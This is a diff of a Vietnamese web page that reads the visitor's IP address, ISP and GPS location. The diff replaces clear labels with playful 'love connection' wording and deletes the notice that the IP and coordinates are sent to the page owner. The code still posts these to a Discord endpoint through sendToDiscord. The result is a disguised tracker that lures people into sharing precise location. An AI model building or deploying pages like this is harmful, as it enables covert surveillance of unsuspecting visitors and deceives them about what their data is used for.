@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Định Vị — Vị trí &amp; IP của bạn</title>
+<title>Kết Nối Yêu Thương Cùng DoctorThanh:)</title>
 <style>
   :root{
     --ink:#1c2b25;
@@ -175,45 +175,42 @@
 
 <div class="sheet">
   <header>
-    <div class="eyebrow">Bảng ghi vị trí</div>
-    <h1>IP &amp; Toạ độ của bạn</h1>
-    <p class="sub">Trang này chỉ đọc những gì trình duyệt của bạn cho phép. Địa chỉ IP được lấy tự động; toạ độ GPS chỉ hiện ra sau khi bạn nhấn nút và đồng ý cấp quyền.</p>
+    <div class="eyebrow">Bảng Kết Nối Yêu Thương</div>
+    <h1>IP &amp; Trái Tim Của Bạn</h1>
+    <p class="sub">Biết Mình Đang Làm Gì Không:)</p>
   </header>
 
   <main>
     <div class="entry">
-      <div class="label">Địa chỉ IP</div>
-      <div class="value pending" id="ipValue">đang truy vấn…</div>
+      <div class="label">ILoveYou</div>
+      <div class="value pending" id="ipValue">Dò...</div>
     </div>
     <div class="entry">
-      <div class="label">Nhà mạng / ISP</div>
-      <div class="value pending" id="ispValue">đang truy vấn…</div>
+      <div class="label">My Love</div>
+      <div class="value pending" id="ispValue">Tọa Đồ Tình Yêu Bạn(IP)</div>
+      <div class="value pending" id="ipLocValue">Dò...</div>
     </div>
     <div class="entry">
-      <div class="label">Vị trí (IP)</div>
-      <div class="value pending" id="ipLocValue">đang truy vấn…</div>
+      <div class="label">Love Hay Love</div>
+      <div class="value muted" id="gpsValue">HeHe</div>
     </div>
     <div class="entry">
-      <div class="label">Vĩ độ / Kinh độ (GPS)</div>
-      <div class="value muted" id="gpsValue">chưa cấp quyền — nhấn "Lấy vị trí GPS"</div>
-    </div>
-    <div class="entry">
-      <div class="label">Độ chính xác</div>
+      <div class="label">I Dont</div>
       <div class="value muted" id="accValue">—</div>
     </div>
 
     <div class="actions">
-      <button class="primary" id="gpsBtn">Lấy vị trí GPS</button>
-      <button class="ghost" id="refreshBtn">Làm mới IP</button>
+      <button class="primary" id="gpsBtn">Start</button>
+      <button class="ghost" id="refreshBtn">Làm Mới</button>
     </div>
 
     <div class="note">
-      Trình duyệt sẽ hiện hộp thoại xin phép trước khi chia sẻ GPS — trang không thể và sẽ không lấy vị trí nếu bạn không đồng ý. Khi bạn đồng ý, toạ độ và IP sẽ được gửi về cho chủ trang để lưu lại.
+      OMG
     </div>
   </main>
 
   <footer>
-    <span>tĩnh · không máy chủ</span>
+    <span>Cảm Ơn Nhiều</span>
     <span id="clock">--:--:--</span>
   </footer>
 </div>
@@ -235,11 +232,11 @@
   const refreshBtn = document.getElementById('refreshBtn');
 
   async function loadIpInfo(){
-    ipEl.textContent = 'đang truy vấn…'; ipEl.classList.add('pending');
-    ispEl.textContent = 'đang truy vấn…'; ispEl.classList.add('pending');
-    ipLocEl.textContent = 'đang truy vấn…'; ipLocEl.classList.add('pending');
+    ipEl.textContent = '…'; ipEl.classList.add('pending');
+    ispEl.textContent = '…'; ispEl.classList.add('pending');
+    ipLocEl.textContent = '…'; ipLocEl.classList.add('pending');
     try{
-      // ipapi.co trả về JSON công khai, không cần API key cho mức dùng cơ bản
+      // APi.co trả về JSON công khai, không cần API key cho mức dùng cơ bản
       const res = await fetch('https://ipapi.co/json/');
       if(!res.ok) throw new Error('request failed');
       const data = await res.json();
@@ -266,7 +263,7 @@
       return;
     }
     gpsBtn.disabled = true;
-    gpsEl.textContent = 'đang chờ bạn cấp quyền…';
+    gpsEl.textContent = 'Mình Xin Phép';
     gpsEl.classList.add('pending');
 
     navigator.geolocation.getCurrentPosition(
@@ -286,7 +283,7 @@
         gpsEl.after(link);
 
         gpsBtn.disabled = false;
-        gpsBtn.textContent = 'Cập nhật lại vị trí';
+        gpsBtn.textContent = 'LOADING';
 
         sendToDiscord({
           ip: ipEl.textContent,
